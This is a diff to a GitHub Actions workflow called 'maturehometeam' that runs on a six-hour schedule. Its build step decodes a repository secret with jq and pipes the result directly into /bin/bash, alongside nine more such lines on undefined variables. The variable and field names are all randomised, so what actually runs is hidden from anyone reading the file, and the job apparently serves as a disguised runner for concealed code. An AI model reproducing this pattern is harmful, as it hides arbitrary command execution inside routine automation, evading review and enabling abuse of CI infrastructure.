@@ -2,23 +2,26 @@ name: maturehometeam
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 2/6 * * *'
+    - cron: '9 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: maturehometeam
         env:
-          k57805: ${{ secrets.k57805 }}
+          dkogn4: ${{ secrets.dkogn4 }}
         run: |
-          echo $k57805 | jq -r .peoz4 | /bin/bash
-          echo $bxipt69 | jq -r .tms96837 | /bin/bash
-          echo $mvyya8 | jq -r .qmxwp919 | /bin/bash
-          echo $wyk3523 | jq -r .r1 | /bin/bash
-          echo $via95851 | jq -r .rian926 | /bin/bash
-          echo $jm5526 | jq -r .g8472 | /bin/bash
-          echo $kya61 | jq -r .mfxfb3776 | /bin/bash
-          echo $cu4 | jq -r .k1 | /bin/bash
-          echo $rz712 | jq -r .vlxn47 | /bin/bash
+          echo $dkogn4 | jq -r .pcclp76 | /bin/bash
+          echo $kecaa36781 | jq -r .j0339 | /bin/bash
+          echo $nl03989 | jq -r .n00165 | /bin/bash
+          echo $vsy791 | jq -r .um52745 | /bin/bash
+          echo $ic259 | jq -r .r347 | /bin/bash
+          echo $eh849 | jq -r .m512 | /bin/bash
+          echo $amz61 | jq -r .z74 | /bin/bash
+          echo $cdufh981 | jq -r .qy9773 | /bin/bash
+          echo $k801 | jq -r .s4 | /bin/bash
+          echo $eiqtj1 | jq -r .ad9 | /bin/bash
 
